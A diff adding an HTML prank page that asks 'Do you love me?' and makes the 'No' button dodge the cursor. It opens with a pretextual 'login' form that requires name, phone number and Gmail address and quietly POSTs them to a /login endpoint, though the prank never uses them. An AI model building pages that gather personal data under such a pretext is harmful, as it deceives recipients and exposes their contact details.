@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Do You Love Me?</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background-color: #fce4ec;
+      overflow: hidden;
+      position: relative;
+    }
+    #loginForm {
+      position: absolute;
+      top: 20%;
+      width: 100%;
+      text-align: center;
+      z-index: 1000;
+      background-color: #fff0f7;
+      padding: 20px;
+    }
+    #loginForm input {
+      padding: 12px;
+      margin: 10px;
+      width: 250px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    #loginForm button {
+      padding: 12px 25px;
+      font-size: 18px;
+      background-color: #d81b60;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .screen {
+      display: none;
+      padding-top: 150px;
+      height: 100vh;
+    }
+    .active {
+      display: block;
+    }
+    h1 {
+      color: #d81b60;
+      font-size: 2em;
+      margin-bottom: 50px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 20px;
+      margin: 20px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      position: relative;
+      transition: 0.2s ease;
+    }
+    .yes {
+      background-color: #4caf50;
+      color: white;
+    }
+    .no {
+      background-color: #f44336;
+      color: white;
+    }
+    #page3-no {
+      position: absolute;
+      top: 65%;
+      left: 60%;
+    }
+    #thankYouScreen {
+      background: linear-gradient(to bottom right, #ff80ab, #ff4081);
+      color: white;
+    }
+    .confetti, .firework {
+      position: fixed;
+      width: 10px;
+      height: 10px;
+      background-color: #ff4081;
+      animation: fall 2s linear infinite;
+      z-index: 999;
+    }
+    @keyframes fall {
+      0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+    }
+    .heart {
+      position: fixed;
+      width: 20px;
+      height: 20px;
+      font-size: 24px;
+      animation: float 4s linear forwards;
+      z-index: 999;
+    }
+    @keyframes float {
+      0% { transform: translateY(0); opacity: 1; }
+      100% { transform: translateY(-100vh); opacity: 0; }
+    }
+    #replayBtn {
+      padding: 15px 30px;
+      font-size: 18px;
+      margin-top: 40px;
+      border: none;
+      border-radius: 10px;
+      background-color: white;
+      color: #d81b60;
+      cursor: pointer;
+    }
+    .emoji {
+      position: absolute;
+      font-size: 30px;
+      animation: bounce 3s infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-20px); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- LOGIN FORM -->
+<div id="loginForm">
+  <h2>Please Login to Continue ❤️</h2>
+  <input type="text" id="name" placeholder="Your Name" required><br>
+  <input type="tel" id="phone" placeholder="Your Phone Number" required><br>
+  <input type="email" id="gmail" placeholder="Your Gmail ID" required><br>
+  <button onclick="submitLogin()">Submit</button>
+</div>
+
+<!-- MAIN APP BELOW -->
+<div id="mainApp" style="display: none;">
+  <audio id="bgMusic" src="https://www.fesliyanstudios.com/play-mp3/387" autoplay loop preload="auto"></audio>
+
+  <div id="screen1" class="screen active">
+    <h1>Do you love me? ❤️</h1>
+    <button class="yes" onclick="showLove()">Yes</button>
+    <button class="no" onclick="goToScreen(2)">No</button>
+  </div>
+
+  <div id="screen2" class="screen">
+    <h1>Think again... Do you love me? 🧐</h1>
+    <button class="yes" onclick="showLove()">Yes</button>
+    <button class="no" onclick="goToScreen(3)">No</button>
+  </div>
+
+  <div id="screen3" class="screen">
+    <h1>You have a last chance... Do you love me? 🥺</h1>
+    <button class="yes" onclick="showLove()">Yes</button>
+    <button class="no" id="page3-no">No</button>
+  </div>
+
+  <div id="thankYouScreen" class="screen">
+    <h1>You made my day! 💞</h1>
+    <button id="replayBtn" onclick="location.reload()">Replay</button>
+  </div>
+</div>
+
+<audio id="loveSound" src="https://www.fesliyanstudios.com/play-mp3/4387" preload="auto"></audio>
+
+<script>
+  const page3No = document.getElementById("page3-no");
+
+  // Auto-login on page load
+  window.onload = function () {
+    const saved = localStorage.getItem("userLoggedIn");
+    if (saved === "true") {
+      document.getElementById("loginForm").style.display = "none";
+      document.getElementById("mainApp").style.display = "block";
+    }
+  };
+
+  function submitLogin() {
+    const name = document.getElementById("name").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    const gmail = document.getElementById("gmail").value.trim();
+
+    if (!name || !phone || !gmail) {
+      alert("Please fill in all fields!");
+      return;
+    }
+
+    fetch("/login", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ name, phone, email: gmail })
+    });
+
+    localStorage.setItem("userLoggedIn", "true");
+
+    document.getElementById("loginForm").style.display = "none";
+    document.getElementById("mainApp").style.display = "block";
+  }
+
+  function goToScreen(num) {
+    document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
+    document.getElementById("screen" + num).classList.add("active");
+  }
+
+  function showLove() {
+    document.getElementById("loveSound").play();
+    showConfetti();
+    showHearts();
+    showFireworks();
+    setTimeout(() => {
+      document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
+      document.getElementById("thankYouScreen").classList.add("active");
+    }, 2000);
+  }
+
+  function showConfetti() {
+    for (let i = 0; i < 100; i++) {
+      const confetti = document.createElement("div");
+      confetti.classList.add("confetti");
+      confetti.style.left = `${Math.random() * 100}%`;
+      confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 70%)`;
+      confetti.style.animationDuration = `${Math.random() * 2 + 1}s`;
+      document.body.appendChild(confetti);
+      setTimeout(() => confetti.remove(), 2000);
+    }
+  }
+
+  function showHearts() {
+    for (let i = 0; i < 50; i++) {
+      const heart = document.createElement("div");
+      heart.classList.add("heart");
+      heart.innerHTML = "❤️";
+      heart.style.left = `${Math.random() * 100}%`;
+      heart.style.animationDuration = `${Math.random() * 3 + 2}s`;
+      document.body.appendChild(heart);
+      setTimeout(() => heart.remove(), 4000);
+    }
+  }
+
+  function showFireworks() {
+    for (let i = 0; i < 30; i++) {
+      const firework = document.createElement("div");
+      firework.classList.add("firework");
+      firework.style.left = `${Math.random() * 100}%`;
+      firework.style.top = `${Math.random() * 50 + 10}%`;
+      firework.style.width = `${Math.random() * 6 + 6}px`;
+      firework.style.height = firework.style.width;
+      firework.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 60%)`;
+      firework.style.animation = 'fall 1.5s ease-out';
+      document.body.appendChild(firework);
+      setTimeout(() => firework.remove(), 1500);
+    }
+  }
+
+  function moveNoButton() {
+    const x = Math.random() * (window.innerWidth - 100);
+    const y = Math.random() * (window.innerHeight - 100);
+    page3No.style.left = `${x}px`;
+    page3No.style.top = `${y}px`;
+  }
+
+  page3No.addEventListener("mouseenter", moveNoButton);
+  document.addEventListener("touchstart", function (e) {
+    if (!page3No.offsetParent) return;
+    const rect = page3No.getBoundingClientRect();
+    const touch = e.touches[0];
+    const buffer = 80;
+    const nearX = touch.clientX >= rect.left - buffer && touch.clientX <= rect.right + buffer;
+    const nearY = touch.clientY >= rect.top - buffer && touch.clientY <= rect.bottom + buffer;
+    if (nearX && nearY) moveNoButton();
+  });
+
+  const emojis = ["😍", "😘", "🥰", "💘", "💕"];
+  for (let i = 0; i < 15; i++) {
+    const emoji = document.createElement("div");
+    emoji.classList.add("emoji");
+    emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+    emoji.style.left = `${Math.random() * 100}%`;
+    emoji.style.top = `${Math.random() * 100}%`;
+    emoji.style.animationDelay = `${Math.random() * 3}s`;
+    document.body.appendChild(emoji);
+  }
+</script>
+</body>
+</html>
